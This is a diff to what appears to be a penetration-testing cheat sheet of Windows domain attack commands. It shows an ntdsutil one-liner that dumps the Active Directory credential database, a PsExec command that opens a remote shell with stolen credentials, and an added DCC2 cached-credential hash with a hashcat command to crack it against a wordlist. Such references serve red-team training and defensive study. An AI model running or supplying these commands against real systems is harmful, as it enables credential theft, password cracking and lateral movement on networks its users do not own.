@@ -170,3 +170,7 @@ powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 
 #remote windows shell (psexec)
 PsExec.exe \\ip_address -u username -p password cmd.exe
+
+# DCC2 mscache cached domain credentials cracking
+$DCC2$10240#username#b9999...d38e863
+hashcat --force -a 0 -m 2100 --status -o found.txt hash /usr/share/wordlists/rockyou.txt
